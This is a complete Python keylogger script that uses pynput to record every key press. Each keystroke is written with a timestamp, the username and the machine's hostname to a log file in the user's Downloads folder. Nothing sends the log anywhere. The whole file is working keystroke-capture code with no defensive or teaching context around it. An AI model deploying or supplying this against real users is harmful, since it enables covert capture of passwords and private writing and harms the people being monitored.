from pynput.keyboard import Key, Listener
import logging
import os
import getpass
import socket

# Get the path to the download folder
download_folder = os.path.join(os.path.expanduser("~"), "Downloads")

# Set the log file path and name
log_filename = "my_key_log.txt"
log_dir = os.path.join(download_folder, log_filename)

# Get the logged-in username
username = getpass.getuser()

# Get the machine's hostname
hostname = socket.gethostname()

logging.basicConfig(filename=log_dir,
                    level=logging.DEBUG,
                    format='%(asctime)s - %(user)s@%(host)s: %(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S')

def on_press(key):
    """
    Called when a keyboard key is pressed.

    Args:
        key: (str): The pressed key
    """
    logging.info(str(key), extra={'user': username, 'host': hostname})

with Listener(on_press=on_press) as listener:
    listener.join()
